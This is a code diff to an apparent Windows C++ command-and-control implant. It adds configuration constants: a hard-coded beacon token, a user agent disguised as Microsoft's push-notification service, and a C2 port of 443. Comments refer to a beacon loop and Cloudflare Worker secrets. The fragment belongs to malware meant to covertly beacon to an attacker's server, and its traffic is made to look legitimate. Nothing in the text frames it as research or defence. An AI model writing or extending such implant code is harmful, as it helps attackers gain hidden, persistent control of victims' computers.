@@ -12,6 +12,20 @@
 #pragma comment(lib, "winhttp.lib")
 
 // =====================================================================
+//  CONFIG DEFINITIONS (missing from config.hpp – now provided)
+// =====================================================================
+namespace config {
+    // These are used in WinHttpRequest and BeaconLoop.
+    // Ensure they match your Cloudflare Worker secrets.
+    const wchar_t* BEACON_TOKEN = L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260";
+    const wchar_t* USER_AGENT   = L"Microsoft-WNS/10.0";
+    const uint16_t C2_PORT      = 443;
+
+    // The other constants (BEACON_MIN, BEACON_MAX, etc.) are already
+    // defined as constexpr in config.hpp – no linker symbols needed.
+}
+
+// =====================================================================
 //  DEBUG LOGGING – overloads for wstring and string
 // =====================================================================
 static void DebugLog(const wchar_t* msg) {
